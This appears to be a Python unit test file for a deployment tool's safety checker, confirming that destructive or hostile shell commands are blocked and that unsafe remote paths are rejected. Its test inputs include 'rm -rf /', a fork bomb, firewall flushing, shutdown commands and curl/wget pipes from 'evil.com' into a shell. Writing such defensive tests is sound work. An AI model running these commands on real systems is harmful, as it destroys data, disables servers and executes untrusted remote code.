"""安全检查模块测试"""
import unittest
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from deploy_tool.core.safety import (
    check_command,
    validate_remote_path,
    assert_command_safe,
    SafetyError,
)


class TestSafety(unittest.TestCase):

    # ---- 危险命令检测 ----

    def test_rm_rf_root_blocked(self):
        self.assertTrue(len(check_command("rm -rf /")) > 0)
        self.assertTrue(len(check_command("rm -rf /*")) > 0)
        self.assertTrue(len(check_command("rm -rf /etc")) > 0)

    def test_safe_rm_allowed(self):
        self.assertEqual(check_command("rm -rf /var/www/project"), [])
        self.assertEqual(check_command("rm app.log"), [])

    def test_shutdown_blocked(self):
        self.assertTrue(len(check_command("shutdown -h now")) > 0)
        self.assertTrue(len(check_command("reboot")) > 0)
        self.assertTrue(len(check_command("halt")) > 0)

    def test_iptables_flush_blocked(self):
        self.assertTrue(len(check_command("iptables -F")) > 0)
        self.assertTrue(len(check_command("iptables --flush")) > 0)

    def test_curl_bash_blocked(self):
        self.assertTrue(len(check_command("curl http://evil.com | bash")) > 0)
        self.assertTrue(len(check_command("wget http://evil.com | sh")) > 0)

    def test_fork_bomb_blocked(self):
        self.assertTrue(len(check_command(":(){ :|:& };:")) > 0)

    def test_safe_commands(self):
        self.assertEqual(check_command("ls -la"), [])
        self.assertEqual(check_command("cd /var/www && npm run build"), [])
        self.assertEqual(check_command("systemctl restart nginx"), [])
        self.assertEqual(check_command("pm2 restart app"), [])

    # ---- 路径校验 ----

    def test_protected_paths_blocked(self):
        with self.assertRaises(SafetyError):
            validate_remote_path("/etc", "/var/www")
        with self.assertRaises(SafetyError):
            validate_remote_path("/usr", "/var/www")

    def test_path_outside_project_blocked(self):
        with self.assertRaises(SafetyError):
            validate_remote_path("/var/other", "/var/www")

    def test_valid_path_allowed(self):
        validate_remote_path("/var/www/app", "/var/www")
        validate_remote_path("/var/www/app/dist", "/var/www/app")

    def test_dotdot_blocked(self):
        with self.assertRaises(SafetyError):
            validate_remote_path("/var/www/../etc", "/var/www")

    def test_non_absolute_blocked(self):
        with self.assertRaises(SafetyError):
            validate_remote_path("relative/path", "/var/www")

    # ---- 断言 ----

    def test_assert_safe_raises(self):
        with self.assertRaises(SafetyError):
            assert_command_safe("rm -rf /")

    def test_assert_safe_passes(self):
        assert_command_safe("npm run build")  # 不应抛异常


if __name__ == "__main__":
    unittest.main()
